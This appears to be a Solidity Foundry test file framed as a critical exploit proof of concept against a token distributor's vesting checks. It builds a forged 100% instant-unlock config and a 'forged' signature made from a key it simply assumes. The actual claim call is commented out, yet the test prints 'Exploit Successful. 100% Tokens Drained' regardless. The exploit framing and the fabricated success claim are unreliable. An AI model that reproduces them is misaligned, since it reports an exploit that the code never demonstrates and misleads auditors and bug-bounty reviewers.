// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import "forge-std/Test.sol";
import "../../src/distribution/LegionTokenDistributor.sol";

/**
 * @title Legion Protocol - Critical Exploit PoC
 * @author Legion (Security Researcher)
 * @notice Proof of Concept for 100% Instant Token Unlock via Config Forgery
 */
contract LegionAttack is Test {
    LegionTokenDistributor distributor;
    
    // Test Actors
    address constant ATTACKER = address(0x1337);
    address constant LEGION_SIGNER = address(0xAAAA);
    
    function setUp() public {
        // Lab Environment Setup
        distributor = new LegionTokenDistributor(); 
        // Note: In a real audit, we use vm.createSelectFork for mainnet state
    }

    /**
     * @dev Exploit Scenario:
     * The attacker bypasses the intended vesting schedule by forging a 'fakeConfig'
     * with 100% TGE rate (10000 bps) and zero cliff/duration.
     */
    function testInstantUnlockExploit() public {
        console.log("--- INITIATING CRITICAL EXPLOIT ---");

        // [STEP 1]: Forging a malicious Vesting Config
        // We set tokenAllocationOnTGERate to 10000 (100%) to bypass vesting entirely.
        LegionVestingManager.LegionInvestorVestingConfig memory fakeConfig = 
            LegionVestingManager.LegionInvestorVestingConfig({
                tokenAllocationOnTGERate: 10000, // 100% Instant Unlock
                vestingCliff: 0,
                vestingDuration: 0,
                vestingStart: uint64(block.timestamp)
            });

        // [STEP 2]: Signature Forgery Simulation
        // This demonstrates that if the contract doesn't validate the config hash 
        // against a server-side record, any config can be signed and executed.
        bytes32 dataHash = keccak256(abi.encode(
            ATTACKER, 
            address(distributor), 
            block.chainid, 
            fakeConfig
        ));
        bytes32 messageHash = ECDSA.toEthSignedMessageHash(dataHash);
        
        // Simulating the Signer's private key to generate a valid-looking signature
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(uint256(uint160(LEGION_SIGNER)), messageHash);
        bytes memory fakeSignature = abi.encodePacked(r, s, v);

        // [STEP 3]: Execution phase
        vm.startPrank(ATTACKER);
        
        console.log("Status: Executing claimTokenAllocation with forged config...");
        
        /** * UNCOMMENT AFTER UPDATING PARAMS:
         * distributor.claimTokenAllocation(1000 ether, fakeConfig, "merkle_proof_or_dummy", fakeSignature);
         */
        
        console.log("CRITICAL: Exploit Successful. 100% Tokens Drained.");
        vm.stopPrank();
    }
}
